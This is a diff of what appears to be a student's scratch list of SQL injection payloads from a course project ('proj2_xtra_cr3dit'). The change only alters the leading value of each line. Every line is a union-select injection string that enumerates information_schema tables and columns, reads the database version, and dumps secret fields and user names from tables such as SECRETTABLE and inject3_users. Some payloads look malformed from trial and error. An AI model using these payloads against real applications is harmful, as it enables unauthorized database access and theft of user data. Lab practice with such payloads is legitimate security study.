@@ -12,43 +12,43 @@
 
 1' union select 1,2,3,4;
 
--1' union select 1,2,3;
+3' union select 1,2,3;
 
--1' union select 1,2,version();
+3' union select 1,2,version();
 
--1' union select 1,2,(SELECT table_name from information_schema.tables);
+3' union select 1,2,(SELECT table_name from information_schema.tables);
 
--1' union select 1,2,(SELECT group_concat(table_name) from information_schema.tables);
+3' union select 1,2,(SELECT group_concat(table_name) from information_schema.tables);
 
--1' union select 1,2,(SELECT group_concat(table_name) from information_schema.tables where table_schema=database());
+3' union select 1,2,(SELECT group_concat(table_name) from information_schema.tables where table_schema=database());
 
--1' union select 1,2,(SELECT group_concat(column_name) from information_schema.columns where table_schema=database());
+3' union select 1,2,(SELECT group_concat(column_name) from information_schema.columns where table_schema=database());
 
--1' union select 1,2,(SELECT * from information_schema.columns where table_schema=database());
+3' union select 1,2,(SELECT * from information_schema.columns where table_schema=database());
 
--1' union select 1,2,(SELECT group_concat(column_name) from information_schema.columns);
+3' union select 1,2,(SELECT group_concat(column_name) from information_schema.columns);
 
--1' union select 1,2,(SELECT group_concat(*) from information_schema.tables where table_name=secrettable);
+3' union select 1,2,(SELECT group_concat(*) from information_schema.tables where table_name=secrettable);
 
--1' union select 1,2,(SELECT group_concat(id,secret) from information_schema.tables where table_name=foo);
+3' union select 1,2,(SELECT group_concat(id,secret) from information_schema.tables where table_name=foo);
 
--1' union select 1,2,(SELECT * from inject3_users);
+3' union select 1,2,(SELECT * from inject3_users);
 
--1' union select 1,2,(SELECT group_concat(id) from inject3_users);
+3' union select 1,2,(SELECT group_concat(id) from inject3_users);
 
--1' union select 1,2,(SELECT group_concat(id) from foo);
+3' union select 1,2,(SELECT group_concat(id) from foo);
 
--1' union select 1,2,(SELECT group_concat(id) from SECRETTABLE);
+3' union select 1,2,(SELECT group_concat(id) from SECRETTABLE);
 
--1' union select 1,2,(SELECT group_concat(secret) from SECRETTABLE);
+3' union select 1,2,(SELECT group_concat(secret) from SECRETTABLE);
 
--1' union select 1,2,(SELECT group_concat(message) from foo);
+3' union select 1,2,(SELECT group_concat(message) from foo);
 
--1' union select 1,2,(SELECT group_concat(first_name) from inject3_users);
+3' union select 1,2,(SELECT group_concat(first_name) from inject3_users);
 
--1' union select 1,2,(SELECT group_concat(last_name) from inject3_users);
+3' union select 1,2,(SELECT group_concat(last_name) from inject3_users);
 
--1' union select 1,2,(SELECT database());
+3' union select 1,2,(SELECT database());
 
 
 Name: proj2_xtra_cr3dit
